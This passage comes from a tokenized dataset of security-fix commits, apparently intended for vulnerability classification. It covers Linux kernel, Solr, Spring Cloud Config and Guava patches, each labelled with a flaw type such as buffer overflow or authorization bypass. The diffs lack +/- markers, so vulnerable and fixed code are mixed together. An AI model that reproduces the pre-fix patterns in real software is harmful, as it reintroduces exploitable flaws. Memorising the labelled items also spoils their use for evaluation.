"7", "or", "later", ",", "use", "{", "@", "link", "*", "java", ".", "nio", ".", "file", ".", "Files", "#", "createTempDirectory", "}", ",", "transforming", "it", "to", "a", "{", "@", "link", "File", "}", "using", "{", "@", "link", "*", "java", ".", "nio", ".", "file", ".", "Path", "#", "toFile", "(", ")", "toFile", "(", ")}", "if", "needed", ".", "*", "/", "@", "Beta", "@", "Deprecated", "public", "static", "File", "createTempDir", "(", ")", "{", "File", "baseDir", "=", "new", "File", "(", "System", ".", "getProperty", "(", "\"", "java", ".", "io", ".", "tmpdir", "\"", "))", ";", "@", "SuppressWarnings", "(", "\"", "GoodTime", "\"", ")", "/", "/", "reading", "system", "time", "without", "TimeSource", "@", "@", "-", "398", ",", "6", "+", "398", ",", "11", "@", "@", "public", "static", "boolean", "equal", "(", "File", "file1", ",", "File", "file2", ")", "throws", "IOException", "{", "*", "be", "exploited", "to", "create", "security", "vulnerabilities", ",", "especially", "when", "executable", "files", "are", "to", "be", "*", "written", "into", "the", "directory", ".", "*", "*", "<", "p", ">", "Depending", "on", "the", "environmment", "that", "this", "code", "is", "run", "in", ",", "the", "system", "temporary", "directory", "(", "and", "*", "thus", "the", "directory", "this", "method", "creates", ")", "may", "be", "more", "visible", "that", "a", "program", "would", "like", "-", "files", "*", "written", "to", "this", "directory", "may", "be", "read", "or", "overwritten", "by", "hostile", "programs", "running", "on", "the", "same", "*", "machine", ".", "*", "*", "<", "p", ">", "This", "method", "assumes", "that", "the", "temporary", "volume", "is", "writable", ",", "has", "free", "inodes", "and", "free", "blocks", ",", "*", "and", "that", "it", "will", "not", "be", "called", "thousands", "of", "times", "per", "second", ".", "*", "@", "@", "-", "406", ",", "8", "+", "411", ",", "15", "@", "@", "public", "static", "boolean", "equal", "(", "File", "file1", ",", "File", "file2", ")", "throws", "IOException", "{", "*", "*", "@", "return", "the", "newly", "-", "created", "directory", "*", "@", "throws", "IllegalStateException", "if", "the", "directory", "could", "not", "be", "created", "*", "@", "deprecated", "For", "Android", "users", ",", "see", "the", "<", "a", "*", "href", "=", "\"", "https", ":", "//", "developer", ".", "android", ".", "com", "/", "training", "/", "data", "-", "storage", "\"", "target", "=", "\"", "_blank", "\"", ">", "Data", "and", "File", "*", "Storage", "overview", "<", "/", "a", ">", "to", "select", "an", "appropriate", "temporary", "directory", "(", "perhaps", "{", "@", "code", "*", "context", ".", "getCacheDir", "(", ")}", ").", "For", "developers", "on", "Java", "7", "or", "later", ",", "use", "{", "@", "link", "*", "java", ".", "nio", ".", "file", ".", "Files", "#", "createTempDirectory", "}", ",", "transforming", "it", "to", "a", "{", "@", "link", "File", "}", "using", "{", "@", "link", "*", "java", ".", "nio", ".", "file", ".", "Path", "#", "toFile", "(", ")", "toFile", "(", ")}", "if", "needed", ".", "*", "/", "@", "Beta", "@", "Deprecated", "public", "static", "File", "createTempDir", "(", ")", "{", "File", "baseDir", "=", "new", "File", "(", "System", ".", "getProperty", "(", "\"", "java", ".", "io", ".", "tmpdir", "\"", "))", ";", "@", "SuppressWarnings", "(", "\"", "GoodTime", "\"", ")", "/", "/", "reading", "system", "time", "without", "TimeSource"], "docstring_tokens": ["temp", "directory", "creation"]}
{"contents": ["security:", "introduce", "missing", "kfree", "Plug", "this", "leak.", "Acked-by:", "David", "Howells", "<dhowells@redhat.com>", "Cc:", "James", "Morris", "<jmorris@namei.org>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Vegard", "Nossum", "<vegard.nossum@gmail.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "270", ",", "6", "+", "270", ",", "7", "@", "@", "long", "keyctl_join_session_keyring", "(", "const", "char", "__user", "*", "_name", ")", "/", "*", "join", "the", "session", "*", "/", "ret", "=", "join_session_keyring", "(", "name", ")", ";", "kfree", "(", "name", ")", ";", "error", ":", "return", "ret", ";"], "docstring_tokens": ["memory", "leak"]}
{"contents": ["ip_output:", "do", "skb", "ufo", "init", "for", "peeked", "non", "ufo", "skb", "as", "well", "Now,", "if", "user", "application", "does:", "sendto", "len<mtu", "flag", "MSG_MORE", "sendto", "len>mtu", "flag", "0", "The", "skb", "is", "not", "treated", "as", "fragmented", "one", "because", "it", "is", "not", "initialized", "that", "way.", "So", "move", "the", "initialization", "to", "fix", "this.", "introduced", "by:", "commit", "e89e9cf539a28df7d0eb1d0a545368e9920b34ac", "\"[IPv4/IPv6]:", "UFO", "Scatter-gather", "approach\"", "Signed-off-by:", "Jiri", "Pirko", "<jiri@resnulli.us>", "Acked-by:", "Hannes", "Frederic", "Sowa", "<hannes@stressinduktion.org>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "772", ",", "15", "+", "772", ",", "20", "@", "@", "static", "inline", "int", "ip_ufo_append_data", "(", "struct", "sock", "*", "sk", ",", "/", "*", "initialize", "protocol", "header", "pointer", "*", "/", "skb", "-", ">", "transport_header", "=", "skb", "-", ">", "network_header", "+", "fragheaderlen", ";", "skb", "-", ">", "ip_summed", "=", "CHECKSUM_PARTIAL", ";", "skb", "-", ">", "csum", "=", "0", ";", "/", "*", "specify", "the", "length", "of", "each", "IP", "datagram", "fragment", "*", "/", "skb_shinfo", "(", "skb", ")", "->", "gso_size", "=", "maxfraglen", "-", "fragheaderlen", ";", "skb_shinfo", "(", "skb", ")", "->", "gso_type", "=", "SKB_GSO_UDP", ";", "__skb_queue_tail", "(", "queue", ",", "skb", ")", ";", "}", "else", "if", "(", "skb_is_gso", "(", "skb", ")", ")", "{", "goto", "append", ";", "}", "skb", "-", ">", "ip_summed", "=", "CHECKSUM_PARTIAL", ";", "/", "*", "specify", "the", "length", "of", "each", "IP", "datagram", "fragment", "*", "/", "skb_shinfo", "(", "skb", ")", "->", "gso_size", "=", "maxfraglen", "-", "fragheaderlen", ";", "skb_shinfo", "(", "skb", ")", "->", "gso_type", "=", "SKB_GSO_UDP", ";", "append", ":", "return", "skb_append_datato_frags", "(", "sk", ",", "skb", ",", "getfrag", ",", "from", ",", "(", "length", "-", "transhdrlen", ")", ");", "}"], "docstring_tokens": ["memory", "corruption"]}
{"contents": ["sgi-gru:", "decrapfiy", "options_write()", "function", "Not", "a", "single", "line", "of", "actual", "code", "in", "the", "function", "was", "really", "fundamentally", "correct.", "Problems", "ranged", "from", "lack", "of", "proper", "range", "checking,", "to", "removing", "the", "last", "character", "written", "(which", "admittedly", "is", "usually", "'\\n'),", "to", "not", "accepting", "hex", "numbers", "even", "though", "the", "'show'", "routine", "would", "show", "the", "data", "in", "that", "format.", "This", "tries", "to", "do", "better.", "Acked-by:", "Michael", "Buesch", "<mb@bu3sch.de>", "Tested-and-acked-by:", "Jack", "Steiner", "<steiner@sgi.com>", "Cc:", "stable@kernel.org", "Cc:", "Jiri", "Kosina", "<jkosina@suse.cz>", "Cc:", "Michael", "Gilbert", "<michael.s.gilbert@gmail.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "161", ",", "14", "+", "161", ",", "15", "@", "@", "static", "int", "options_show", "(", "struct", "seq_file", "*", "s", ",", "void", "*", "p", ")", "static", "ssize_t", "options_write", "(", "struct", "file", "*", "file", ",", "const", "char", "__user", "*", "userbuf", ",", "size_t", "count", ",", "loff_t", "*", "data", ")", "{", "unsigned", "long", "val", ";", "char", "buf", "[", "80", "]", ";", "char", "buf", "[", "20", "]", ";", "if", "(", "strncpy_from_user", "(", "buf", ",", "userbuf", ",", "sizeof", "(", "buf", ")", "-", "1", ")", "<", "0", ")", "if", "(", "count", ">", "=", "sizeof", "(", "buf", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "copy_from_user", "(", "buf", ",", "userbuf", ",", "count", ")", ")", "return", "-", "EFAULT", ";", "buf", "[", "count", "-", "1", "]", "=", "'", "\\", "0", "'", ";", "if", "(", "!", "strict_strtoul", "(", "buf", ",", "10", ",", "&", "val", ")", ")", "gru_options", "=", "val", ";", "buf", "[", "count", "]", "=", "'", "\\", "0", "'", ";", "if", "(", "strict_strtoul", "(", "buf", ",", "0", ",", "&", "gru_options", ")", ")", "return", "-", "EINVAL", ";", "return", "count", ";", "}"], "docstring_tokens": ["off-by-one", "error"]}
{"contents": ["sound/oss/opl3:", "validate", "voice", "and", "channel", "indexes", "User-controllable", "indexes", "for", "voice", "and", "channel", "values", "may", "cause", "reading", "and", "writing", "beyond", "the", "bounds", "of", "their", "respective", "arrays,", "leading", "to", "potentially", "exploitable", "memory", "corruption.", "Validate", "these", "indexes.", "Signed-off-by:", "Dan", "Rosenberg", "<drosenberg@vsecurity.com>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["@", "@", "-", "845", ",", "6", "+", "845", ",", "10", "@", "@", "static", "int", "opl3_load_patch", "(", "int", "dev", ",", "int", "format", ",", "const", "char", "__user", "*", "addr", ",", "static", "void", "opl3_panning", "(", "int", "dev", ",", "int", "voice", ",", "int", "value", ")", "{", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "panning", "=", "value", ";", "}", "@", "@", "-", "1062", ",", "8", "+", "1066", ",", "15", "@", "@", "static", "int", "opl3_alloc_voice", "(", "int", "dev", ",", "int", "chn", ",", "int", "note", ",", "struct", "voice_alloc_info", "static", "void", "opl3_setup_voice", "(", "int", "dev", ",", "int", "voice", ",", "int", "chn", ")", "{", "struct", "channel_info", "*", "info", "=", "&", "synth_devs", "[", "dev", "]", "->", "chn_info", "[", "chn", "]", ";", "struct", "channel_info", "*", "info", ";", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "if", "(", "chn", "<", "0", "|", "|", "chn", ">", "15", ")", "return", ";", "info", "=", "&", "synth_devs", "[", "dev", "]", "->", "chn_info", "[", "chn", "]", ";", "opl3_set_instr", "(", "dev", ",", "voice", ",", "info", "-", ">", "pgm_num", ")", ";"], "docstring_tokens": ["memory", "corruption"]}
{"contents": ["cifs:", "Rename", "cifs_strncpy_to_host", "and", "fix", "buffer", "size", "There", "is", "a", "possibility", "for", "the", "path_name", "and", "node_name", "buffers", "to", "overflow", "if", "they", "contain", "charcters", "that", "are", ">2", "bytes", "in", "the", "local", "charset.", "Resize", "the", "buffer", "allocation", "so", "to", "avoid", "this", "possibility.", "Also,", "as", "pointed", "out", "by", "Jeff", "Layton,", "it", "would", "be", "appropriate", "to", "rename", "the", "function", "to", "cifs_strlcpy_to_host", "to", "reflect", "the", "fact", "that", "the", "copied", "string", "is", "always", "NULL", "terminated.", "Signed-off-by:", "Suresh", "Jayaraman", "<sjayaraman@suse.de>", "Acked-by:", "Jeff", "Layton", "<jlayton@redhat.com>", "Signed-off-by:", "Steve", "French", "<sfrench@us.ibm.com>"], "code_tokens": ["@", "@", "-", "88", ",", "29", "+", "88", ",", "29", "@", "@", "static", "struct", "{", "*", "on", "failure", "-", "errno", "*", "/", "static", "int", "cifs_strncpy_to_host", "(", "char", "*", "*", "dst", ",", "const", "char", "*", "src", ",", "const", "int", "maxlen", ",", "cifs_strlcpy_to_host", "(", "char", "*", "*", "dst", ",", "const", "char", "*", "src", ",", "const", "int", "maxlen", ",", "const", "bool", "is_unicode", ",", "const", "struct", "nls_table", "*", "nls_codepage", ")", "{", "int", "plen", ";", "if", "(", "is_unicode", ")", "{", "plen", "=", "UniStrnlen", "(", "(", "wchar_t", "*", ")", "src", ",", "maxlen", ")", ";", "*", "dst", "=", "kmalloc", "(", "plen", "+", "2", ",", "GFP_KERNEL", ")", ";", "*", "dst", "=", "kmalloc", "(", "(", "4", "*", "plen", ")", "+", "2", ",", "GFP_KERNEL", ")", ";", "if", "(", "!*", "dst", ")", "goto", "cifs_strncpy_to_host_ErrExit", ";", "goto", "cifs_strlcpy_to_host_ErrExit", ";", "cifs_strfromUCS_le", "(", "*", "dst", ",", "(", "__le16", "*", ")", "src", ",", "plen", ",", "nls_codepage", ")", ";", "(", "*", "dst", ")", "[", "plen", "]", "=", "0", ";", "(", "*", "dst", ")", "[", "plen", "+", "1", "]", "=", "0", ";", "/", "*", "needed", "for", "Unicode", "*", "/", "}", "else", "{", "plen", "=", "strnlen", "(", "src", ",", "maxlen", ")", ";", "*", "dst", "=", "kmalloc", "(", "plen", "+", "2", ",", "GFP_KERNEL", ")", ";", "if", "(", "!*", "dst", ")", "goto", "cifs_strncpy_to_host_ErrExit", ";", "strncpy", "(", "*", "dst", ",", "src", ",", "plen", ")", ";", "goto", "cifs_strlcpy_to_host_ErrExit", ";", "strlcpy", "(", "*", "dst", ",", "src", ",", "plen", ")", ";", "}", "(", "*", "dst", ")", "[", "plen", "]", "=", "0", ";", "(", "*", "dst", ")", "[", "plen", "+", "1", "]", "=", "0", ";", "/", "*", "harmless", "for", "ASCII", "case", ",", "needed", "for", "Unicode", "*", "/", "return", "0", ";", "cifs_strncpy_to_host_ErrExit", ":", "cifs_strlcpy_to_host_ErrExit", ":", "cERROR", "(", "1", ",", "(", "\"", "Failed", "to", "allocate", "buffer", "for", "string", "\\", "n", "\"", "))", ";", "return", "-", "ENOMEM", ";", "}", "@", "@", "-", "4029", ",", "15", "+", "4029", ",", "15", "@", "@", "parse_DFS_referrals", "(", "TRANSACTION2_GET_DFS_REFER_RSP", "*", "pSMBr", ",", "/", "*", "copy", "DfsPath", "*", "/", "temp", "=", "(", "char", "*", ")", "ref", "+", "le16_to_cpu", "(", "ref", "-", ">", "DfsPathOffset", ")", ";", "max_len", "=", "data_end", "-", "temp", ";", "rc", "=", "cifs_strncpy_to_host", "(", "&(", "node", "-", ">", "path_name", ")", ",", "temp", ",", "rc", "=", "cifs_strlcpy_to_host", "(", "&(", "node", "-", ">", "path_name", ")", ",", "temp", ",", "max_len", ",", "is_unicode", ",", "nls_codepage", ")", ";", "if", "(", "rc", ")", "goto", "parse_DFS_referrals_exit", ";", "/", "*", "copy", "link", "target", "UNC", "*", "/", "temp", "=", "(", "char", "*", ")", "ref", "+", "le16_to_cpu", "(", "ref", "-", ">", "NetworkAddressOffset", ")", ";", "max_len", "=", "data_end", "-", "temp", ";", "rc", "=", "cifs_strncpy_to_host", "(", "&(", "node", "-", ">", "node_name", ")", ",", "temp", ",", "rc", "=", "cifs_strlcpy_to_host", "(", "&(", "node", "-", ">", "node_name", ")", ",", "temp", ",", "max_len", ",", "is_unicode", ",", "nls_codepage", ")", ";", "if", "(", "rc", ")", "goto", "parse_DFS_referrals_exit", ";"], "docstring_tokens": ["a", "buffer", "overflow"]}
{"contents": ["ALSA:", "timer:", "Fix", "leak", "in", "events", "via", "snd_timer_user_ccallback", "The", "stack", "object", "\u201cr1\u201d", "has", "a", "total", "size", "of", "32", "bytes.", "Its", "field", "\u201cevent\u201d", "and", "\u201cval\u201d", "both", "contain", "4", "bytes", "padding.", "These", "8", "bytes", "padding", "bytes", "are", "sent", "to", "user", "without", "being", "initialized.", "Signed-off-by:", "Kangjie", "Lu", "<kjlu@gatech.edu>", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["@", "@", "-", "1223", ",", "6", "+", "1223", ",", "7", "@", "@", "static", "void", "snd_timer_user_ccallback", "(", "struct", "snd_timer_instance", "*", "timeri", ",", "tu", "-", ">", "tstamp", "=", "*", "tstamp", ";", "if", "(", "(", "tu", "-", ">", "filter", "&", "(", "1", "<", "<", "event", ")", ")", "=", "=", "0", "|", "|", "!", "tu", "-", ">", "tread", ")", "return", ";", "memset", "(", "&", "r1", ",", "0", ",", "sizeof", "(", "r1", ")", ");", "r1", ".", "event", "=", "event", ";", "r1", ".", "tstamp", "=", "*", "tstamp", ";", "r1", ".", "val", "=", "resolution", ";"], "docstring_tokens": ["kernel", "pointer", "leak"]}
{"contents": ["Bluetooth:", "hidp_connection_add()", "unsafe", "use", "of", "l2cap_pi()", "it's", "OK", "after", "we'd", "verified", "the", "sockets,", "but", "not", "before", "that.", "Signed-off-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Signed-off-by:", "Marcel", "Holtmann", "<marcel@holtmann.org>"], "code_tokens": ["@", "@", "-", "1314", ",", "13", "+", "1314", ",", "14", "@", "@", "int", "hidp_connection_add", "(", "struct", "hidp_connadd_req", "*", "req", ",", "{", "struct", "hidp_session", "*", "session", ";", "struct", "l2cap_conn", "*", "conn", ";", "struct", "l2cap_chan", "*", "chan", "=", "l2cap_pi", "(", "ctrl_sock", "-", ">", "sk", ")", "->", "chan", ";", "struct", "l2cap_chan", "*", "chan", ";", "int", "ret", ";", "ret", "=", "hidp_verify_sockets", "(", "ctrl_sock", ",", "intr_sock", ")", ";", "if", "(", "ret", ")", "return", "ret", ";", "chan", "=", "l2cap_pi", "(", "ctrl_sock", "-", ">", "sk", ")", "->", "chan", ";", "conn", "=", "NULL", ";", "l2cap_chan_lock", "(", "chan", ")", ";", "if", "(", "chan", "-", ">", "conn", ")"], "docstring_tokens": ["out-of-bound", "access"]}
{"contents": ["KVM:", "Prevent", "overflow", "in", "KVM_GET_SUPPORTED_CPUID", "The", "number", "of", "entries", "is", "multiplied", "by", "the", "entry", "size,", "which", "can", "overflow", "on", "32-bit", "hosts.", "Bound", "the", "entry", "count", "instead.", "Reported-by:", "David", "Wagner", "<daw@cs.berkeley.edu>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Avi", "Kivity", "<avi@redhat.com>"], "code_tokens": ["@", "@", "-", "1591", ",", "6", "+", "1591", ",", "8", "@", "@", "static", "int", "kvm_dev_ioctl_get_supported_cpuid", "(", "struct", "kvm_cpuid2", "*", "cpuid", ",", "if", "(", "cpuid", "-", ">", "nent", "<", "1", ")", "goto", "out", ";", "if", "(", "cpuid", "-", ">", "nent", ">", "KVM_MAX_CPUID_ENTRIES", ")", "cpuid", "-", ">", "nent", "=", "KVM_MAX_CPUID_ENTRIES", ";", "r", "=", "-", "ENOMEM", ";", "cpuid_entries", "=", "vmalloc", "(", "sizeof", "(", "struct", "kvm_cpuid_entry2", ")", "*", "cpuid", "-", ">", "nent", ")", ";", "if", "(", "!", "cpuid_entries", ")"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["[NETLINK]:", "Infinite", "recursion", "in", "netlink.", "Reply", "to", "NETLINK_FIB_LOOKUP", "messages", "were", "misrouted", "back", "to", "kernel,", "which", "resulted", "in", "infinite", "recursion", "and", "stack", "overflow.", "The", "bug", "is", "present", "in", "all", "kernel", "versions", "since", "the", "feature", "appeared.", "The", "patch", "also", "makes", "some", "minimal", "cleanup:", "1.", "Return", "something", "consistent", "(-ENOENT)", "when", "fib", "table", "is", "missing", "2.", "Do", "not", "crash", "when", "queue", "is", "empty", "(does", "not", "happen,", "but", "yet)", "3.", "Put", "result", "of", "lookup", "Signed-off-by:", "Alexey", "Kuznetsov", "<kuznet@ms2.inr.ac.ru>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "776", ",", "6", "+", "776", ",", "8", "@", "@", "static", "void", "nl_fib_lookup", "(", "struct", "fib_result_nl", "*", "frn", ",", "struct", "fib_table", "*", "tb", ")", ".", "nl_u", "=", "{", ".", "ip4_u", "=", "{", ".", "daddr", "=", "frn", "-", ">", "fl_addr", ",", ".", "tos", "=", "frn", "-", ">", "fl_tos", ",", ".", "scope", "=", "frn", "-", ">", "fl_scope", "}", "}", "}", ";", "frn", "-", ">", "err", "=", "-", "ENOENT", ";", "if", "(", "tb", ")", "{", "local_bh_disable", "(", ");", "@", "@", "-", "787", ",", "6", "+", "789", ",", "7", "@", "@", "static", "void", "nl_fib_lookup", "(", "struct", "fib_result_nl", "*", "frn", ",", "struct", "fib_table", "*", "tb", ")", "frn", "-", ">", "nh_sel", "=", "res", ".", "nh_sel", ";", "frn", "-", ">", "type", "=", "res", ".", "type", ";", "frn", "-", ">", "scope", "=", "res", ".", "scope", ";", "fib_res_put", "(", "&", "res", ")", ";", "}", "local_bh_enable", "(", ");", "}", "@", "@", "-", "801", ",", "6", "+", "804", ",", "9", "@", "@", "static", "void", "nl_fib_input", "(", "struct", "sock", "*", "sk", ",", "int", "len", ")", "struct", "fib_table", "*", "tb", ";", "skb", "=", "skb_dequeue", "(", "&", "sk", "-", ">", "sk_receive_queue", ")", ";", "if", "(", "skb", "=", "=", "NULL", ")", "return", ";", "nlh", "=", "(", "struct", "nlmsghdr", "*", ")", "skb", "-", ">", "data", ";", "if", "(", "skb", "-", ">", "len", "<", "NLMSG_SPACE", "(", "0", ")", "|", "|", "skb", "-", ">", "len", "<", "nlh", "-", ">", "nlmsg_len", "|", "|", "nlh", "-", ">", "nlmsg_len", "<", "NLMSG_LENGTH", "(", "sizeof", "(", "*", "frn", ")", "))", "{", "@", "@", "-", "813", ",", "7", "+", "819", ",", "7", "@", "@", "static", "void", "nl_fib_input", "(", "struct", "sock", "*", "sk", ",", "int", "len", ")", "nl_fib_lookup", "(", "frn", ",", "tb", ")", ";", "pid", "=", "nlh", "-", ">", "nlmsg_pid", ";", "/", "*", "pid", "of", "sending", "process", "*", "/", "pid", "=", "NETLINK_CB", "(", "skb", ")", ".", "pid", ";", "/", "*", "pid", "of", "sending", "process", "*", "/", "NETLINK_CB", "(", "skb", ")", ".", "pid", "=", "0", ";", "/", "*", "from", "kernel", "*", "/", "NETLINK_CB", "(", "skb", ")", ".", "dst_group", "=", "0", ";", "/", "*", "unicast", "*", "/", "netlink_unicast", "(", "sk", ",", "skb", ",", "pid", ",", "MSG_DONTWAIT", ")", ";"], "docstring_tokens": ["stack", "overflow"]}
{"contents": ["SOLR-12514:", "Rule-base", "Authorization", "plugin", "skips", "authorization", "if", "querying", "node", "does", "not", "have", "collection", "replica"], "code_tokens": ["@", "@", "-", "198", ",", "6", "+", "198", ",", "8", "@", "@", "Bug", "Fixes", "scheduled", "triggers", "not", "be", "used", "for", "very", "frequent", "operations", "to", "avoid", "this", "problem", ".", "(", "ab", ",", "shalin", ")", "*", "SOLR", "-", "12514", ":", "Rule", "-", "base", "Authorization", "plugin", "skips", "authorization", "if", "querying", "node", "does", "not", "have", "collection", "replica", "(", "noble", ")", "Improvements", "@", "@", "-", "496", ",", "6", "+", "496", ",", "7", "@", "@", "public", "Action", "call", "(", ")", "throws", "IOException", "{", "handleAdminRequest", "(", ");", "return", "RETURN", ";", "case", "REMOTEQUERY", ":", "SolrRequestInfo", ".", "setRequestInfo", "(", "new", "SolrRequestInfo", "(", "solrReq", ",", "new", "SolrQueryResponse", "(", "))", ");", "remoteQuery", "(", "coreUrl", "+", "path", ",", "resp", ")", ";", "return", "RETURN", ";", "case", "PROCESS", ":", "@", "@", "-", "312", ",", "6", "+", "312", ",", "7", "@", "@", "public", "void", "testProxyNullProxyUser", "(", ")", "throws", "Exception", "{", "}", "@", "Test", "@", "AwaitsFix", "(", "bugUrl", "=", "\"", "https", ":", "//", "issues", ".", "apache", ".", "org", "/", "jira", "/", "browse", "/", "SOLR", "-", "13098", "\"", ")", "public", "void", "testForwarding", "(", ")", "throws", "Exception", "{", "String", "collectionName", "=", "\"", "forwardingCollection", "\"", ";", "miniCluster", ".", "uploadConfigSet", "(", "TEST_PATH", "(", ").", "resolve", "(", "\"", "collection1", "/", "conf", "\"", "),", "\"", "conf1", "\"", ");", "@", "@", "-", "100", ",", "7", "+", "100", ",", "7", "@", "@", "public", "void", "tearDownCluster", "(", ")", "throws", "Exception", "{", "@", "Test", "/", "/", "commented", "9", "-", "Aug", "-", "2018", "@", "BadApple", "(", "bugUrl", "=", "\"", "https", ":", "//", "issues", ".", "apache", ".", "org", "/", "jira", "/", "browse", "/", "SOLR", "-", "12028", "\"", ")", "/", "/", "21", "-", "May", "-", "2018", "@", "BadApple", "(", "bugUrl", "=", "\"", "https", ":", "//", "issues", ".", "apache", ".", "org", "/", "jira", "/", "browse", "/", "SOLR", "-", "12028", "\"", ")", "/", "/", "annotated", "on", ":", "24", "-", "Dec", "-", "2018", "/", "/", "@", "BadApple", "(", "bugUrl", "=", "\"", "https", ":", "//", "issues", ".", "apache", ".", "org", "/", "jira", "/", "browse", "/", "SOLR", "-", "12028", "\"", ")", "/", "/", "annotated", "on", ":", "24", "-", "Dec", "-", "2018", "public", "void", "testBasicAuth", "(", ")", "throws", "Exception", "{", "boolean", "isUseV2Api", "=", "random", "(", ").", "nextBoolean", "(", ");", "String", "authcPrefix", "=", "\"", "/", "admin", "/", "authentication", "\"", ";", "@", "@", "-", "239", ",", "6", "+", "239", ",", "19", "@", "@", "public", "void", "testBasicAuth", "(", ")", "throws", "Exception", "{", "del", ".", "setCommitWithin", "(", "10", ")", ";", "del", ".", "process", "(", "cluster", ".", "getSolrClient", "(", "),", "COLLECTION", ")", ";", "/", "/", "Test", "for", "SOLR", "-", "12514", ".", "Create", "a", "new", "jetty", ".", "This", "jetty", "does", "not", "have", "the", "collection", ".", "/", "/", "Make", "a", "request", "to", "that", "jetty", "and", "it", "should", "fail", "JettySolrRunner", "aNewJetty", "=", "cluster", ".", "startJettySolrRunner", "(", ");", "try", "{", "del", "=", "new", "UpdateRequest", "(", ").", "deleteByQuery", "(", "\"*", ":*", "\")", ";", "del", ".", "process", "(", "aNewJetty", ".", "newClient", "(", "),", "COLLECTION", ")", ";", "fail", "(", "\"", "This", "should", "not", "have", "succeeded", "without", "credentials", "\"", ");", "}", "catch", "(", "HttpSolrClient", ".", "RemoteSolrException", "e", ")", "{", "assertTrue", "(", "e", ".", "getMessage", "(", ").", "contains", "(", "\"", "Unauthorized", "request", "\"", "))", ";", "}", "finally", "{", "cluster", ".", "stopJettySolrRunner", "(", "aNewJetty", ")", ";", "}", "addDocument", "(", "\"", "harry", "\"", ",\"", "HarryIsUberCool", "\"", ",\"", "id", "\"", ",", "\"", "4", "\"", ");", "executeCommand", "(", "baseUrl", "+", "authcPrefix", ",", "cl", ",", "\"", "{", "set", "-", "property", ":", "{", "blockUnknown", ":", "true", "}", "}\"", ",", "\"", "harry", "\"", ",", "\"", "HarryIsUberCool", "\"", ");"], "docstring_tokens": ["bug", "disclosure"]}
{"contents": ["Verifies", "resources", "are", "in", "allowed", "locations"], "code_tokens": ["@", "@", "-", "17", ",", "6", "+", "17", ",", "7", "@", "@", "package", "org", ".", "springframework", ".", "cloud", ".", "config", ".", "server", ".", "resource", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "LinkedHashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "@", "@", "-", "56", ",", "18", "+", "57", ",", "22", "@", "@", "public", "synchronized", "Resource", "findOne", "(", "String", "application", ",", "String", "profile", ",", "String", "if", "(", "StringUtils", ".", "hasText", "(", "path", ")", ")", "{", "String", "[", "]", "locations", "=", "this", ".", "service", ".", "getLocations", "(", "application", ",", "profile", ",", "label", ")", ".", "getLocations", "(", ");", "ArrayList", "<", "Resource", ">", "locationResources", "=", "new", "ArrayList", "<", ">(", ");", "for", "(", "int", "i", "=", "locations", ".", "length", ";", "i", "-", "-", ">", "0", ";", ")", "{", "String", "location", "=", "locations", "[", "i", "]", ";", "if", "(", "!", "PathUtils", ".", "isInvalidEncodedLocation", "(", "location", ")", ")", "{", "locationResources", ".", "add", "(", "this", ".", "resourceLoader", ".", "getResource", "(", "location", ")", ");", "}", "}", "try", "{", "for", "(", "int", "i", "=", "locations", ".", "length", ";", "i", "-", "-", ">", "0", ";", ")", "{", "String", "location", "=", "locations", "[", "i", "]", ";", "if", "(", "PathUtils", ".", "isInvalidEncodedLocation", "(", "location", ")", ")", "{", "continue", ";", "}", "for", "(", "Resource", "location", ":", "locationResources", ")", "{", "for", "(", "String", "local", ":", "getProfilePaths", "(", "profile", ",", "path", ")", ")", "{", "if", "(", "!", "PathUtils", ".", "isInvalidPath", "(", "local", ")", "&", "&", "!", "PathUtils", ".", "isInvalidEncodedPath", "(", "local", ")", ")", "{", "Resource", "file", "=", "this", ".", "resourceLoader", ".", "getResource", "(", "location", ")", ".", "createRelative", "(", "local", ")", ";", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "isReadable", "(", "))", "{", "Resource", "file", "=", "location", ".", "createRelative", "(", "local", ")", ";", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "isReadable", "(", ")", "&", "&", "PathUtils", ".", "checkResource", "(", "file", ",", "location", ",", "locationResources", ")", ")", "{", "return", "file", ";", "}", "}", "@", "@", "-", "16", ",", "12", "+", "16", ",", "17", "@", "@", "package", "org", ".", "springframework", ".", "cloud", ".", "config", ".", "server", ".", "support", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "net", ".", "URLDecoder", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "UrlResource", ";", "import", "org", ".", "springframework", ".", "util", ".", "ResourceUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "@", "@", "-", "205", ",", "4", "+", "210", ",", "71", "@", "@", "public", "static", "boolean", "isInvalidPath", "(", "String", "path", ")", "{", "return", "false", ";", "}", "/", "**", "*", "Perform", "additional", "checks", "on", "a", "resolved", "resource", "beyond", "checking", "whether", "the", "*", 